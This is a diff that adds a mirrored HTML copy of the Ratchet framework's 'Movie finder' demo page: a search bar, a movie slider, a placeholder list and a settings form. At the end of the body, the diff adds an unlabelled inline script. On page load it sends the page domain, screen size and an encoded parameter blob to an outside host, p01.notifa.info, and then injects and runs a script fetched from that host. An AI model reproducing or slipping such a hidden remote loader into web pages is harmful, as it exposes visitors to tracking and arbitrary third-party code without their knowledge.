@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+  
+<!-- Mirrored from goratchet.com/examples/app-movies/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 19 Oct 2019 15:47:03 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="utf-8">
+    <title>Movie finder</title>
+    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+    <link rel="stylesheet" href="../../dist/css/ratchet.min.css">
+    <link rel="stylesheet" href="css/app.css">
+    <script src="../../dist/js/ratchet.min.js"></script>
+  </head>
+  <body>
+    <header class="bar bar-nav">
+      <a class="icon icon-gear pull-right" href="#settingsModal"></a>
+      <h1 class="title">Movie finder</h1>
+    </header>
+
+    <div class="bar bar-standard bar-header-secondary">
+      <form>
+        <input type="search" placeholder="Search">
+      </form>
+    </div>
+
+    <div class="content">
+
+      <div class="slider">
+        <div class="slide-group">
+          <div class="slide">
+            <img src="img/argo.png" alt="Argo" width="640" height="300">
+          </div>
+          <div class="slide">
+             <img src="img/skyfall.png" alt="Skyfall" width="640" height="300">
+          </div>
+          <div class="slide">
+             <img src="img/ralph.png" alt="Wreck-It Ralph" width="640" height="300">
+          </div>
+        </div>
+      </div>
+
+      <ul class="table-view">
+        <li class="table-view-cell table-view-divider">Recommended movies</li>
+        <li class="table-view-cell media">
+          <a class="navigate-right" href="choose-theater.html" data-transition="slide-in">
+            <img class="media-object pull-left" src="http://placehold.it/64x64" alt="Placeholder image for Argo's poster">
+            <div class="media-body">
+              Argo
+              <p>Lorem ipsum dolor sit amet, consectetur.</p>
+            </div>
+          </a>
+        </li>
+        <li class="table-view-cell media">
+          <a class="navigate-right" href="choose-theater.html" data-transition="slide-in">
+            <img class="media-object pull-left" src="http://placehold.it/64x64" alt="Placeholder image for Skyfall's poster">
+            <div class="media-body">
+              Skyfall: 007
+              <p>Lorem ipsum dolor sit amet, consectetur.</p>
+            </div>
+          </a>
+        </li>
+        <li class="table-view-cell media">
+          <a class="navigate-right" href="choose-theater.html" data-transition="slide-in">
+            <img class="media-object pull-left" src="http://placehold.it/64x64" alt="Placeholder image for Wreck-it Ralph's poster">
+            <div class="media-body">
+              Wreck-it Ralph
+              <p>Lorem ipsum dolor sit amet, consectetur.</p>
+            </div>
+          </a>
+        </li>
+        <li class="table-view-cell media">
+          <a class="navigate-right" href="choose-theater.html" data-transition="slide-in">
+            <img class="media-object pull-left" src="http://placehold.it/64x64" alt="Placeholder image for Argo's poster">
+            <div class="media-body">
+              Argo
+              <p>Lorem ipsum dolor sit amet, consectetur.</p>
+            </div>
+          </a>
+        </li>
+        <li class="table-view-cell media">
+          <a class="navigate-right" href="choose-theater.html" data-transition="slide-in">
+            <img class="media-object pull-left" src="http://placehold.it/64x64" alt="Placeholder image for Skyfall's poster">
+            <div class="media-body">
+              Skyfall: 007
+              <p>Lorem ipsum dolor sit amet, consectetur.</p>
+            </div>
+          </a>
+        </li>
+        <li class="table-view-cell media">
+          <a class="navigate-right" href="choose-theater.html" data-transition="slide-in">
+            <img class="media-object pull-left" src="http://placehold.it/64x64" alt="Placeholder image for Wreck-it Ralph's poster">
+            <div class="media-body">
+              Wreck-it Ralph
+              <p>Lorem ipsum dolor sit amet, consectetur.</p>
+            </div>
+          </a>
+        </li>
+        <li class="table-view-cell media">
+          <a class="navigate-right" href="choose-theater.html" data-transition="slide-in">
+            <img class="media-object pull-left" src="http://placehold.it/64x64" alt="Placeholder image for Argo's poster">
+            <div class="media-body">
+              Argo
+              <p>Lorem ipsum dolor sit amet, consectetur.</p>
+            </div>
+          </a>
+        </li>
+        <li class="table-view-cell media">
+          <a class="navigate-right" href="choose-theater.html" data-transition="slide-in">
+            <img class="media-object pull-left" src="http://placehold.it/64x64" alt="Placeholder image for Skyfall's poster">
+            <div class="media-body">
+              Skyfall: 007
+              <p>Lorem ipsum dolor sit amet, consectetur.</p>
+            </div>
+          </a>
+        </li>
+        <li class="table-view-cell media">
+          <a class="navigate-right" href="choose-theater.html" data-transition="slide-in">
+            <img class="media-object pull-left" src="http://placehold.it/64x64" alt="Placeholder image for Wreck-it Ralph's poster">
+            <div class="media-body">
+              Wreck-it Ralph
+              <p>Lorem ipsum dolor sit amet, consectetur.</p>
+            </div>
+          </a>
+        </li>
+      </ul>
+    </div><!-- /.content -->
+
+    <!-- Settings modal -->
+    <div id="settingsModal" class="modal">
+      <header class="bar bar-nav">
+        <a class="icon icon-close pull-right" href="#settingsModal"></a>
+        <h1 class="title">Settings</h1>
+      </header>
+
+      <div class="content">
+        <form class="input-group">
+          <input type="text" placeholder="Full name">
+          <input type="email" placeholder="Email">
+          <input type="text" placeholder="Username">
+        </form>
+
+        <h5 class="content-padded">App settings</h5>
+
+        <ul class="table-view">
+          <li class="table-view-cell media">
+            <span class="media-object pull-left icon icon-sound"></span>
+            <div class="media-body">
+              Enable sounds
+            </div>
+            <div class="toggle">
+              <div class="toggle-handle"></div>
+            </div>
+          </li>
+          <li class="table-view-cell media">
+            <span class="media-object pull-left icon icon-person"></span>
+            <div class="media-body">
+              Parental controls
+            </div>
+            <div class="toggle">
+              <div class="toggle-handle"></div>
+            </div>
+          </li>
+        </ul>
+        <div class="content-padded">
+          <button class="btn btn-positive btn-block">Save settings</button>
+        </div>
+      </div>
+    </div><!-- /.modal -->
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAR2JSDAPT14hVUeGwlNN81chrbtbCDKt9d2xFGoQ5Q%2fFX3%2bWEVuwyW2LBKZPRsUN5JtesY6AyzP6v3eOtkvIvjqq%2bovjM4bfBy8LnPGOVxlFp6H%2fY5Z6kGnn%2bWA1TxzjTmHxcdWveT7E5AyWVcxdsOKzaB39fiNfBrvNQ0b5lvMVCyXXlSGPMq05I5lD0rx2uAWrRU4ssmySqR%2b6CYnjBz8smn0c04j1r5DRU1tJLU0O5nWqAVEYmecu6jugs5id971KMmf16bczGdaJlNO%2b4gYHmFFlJMgSdR4wXdJL7pH%2fv1ZJT1GYlL0cNgpRLYzpLGHo4I0D2ghZa2lmJIat%2bOD96CR62Je1av3NAFL5lumbG3EbRgaGSICF3FkFhS4goyr0dcyl2jSzxOtlcdYJ%2bxqvMY4F0hGgNG3VD2yz1VO%2bnT8MVpbHLUyfDBkTwnkkD%2fdQxa66C6HBkJpfqlzfQ1E2IbgRFhVD76DlSHVcP%2bHR0v3dmbc8yvg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+<!-- Mirrored from goratchet.com/examples/app-movies/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 19 Oct 2019 15:47:03 GMT -->
+</html>
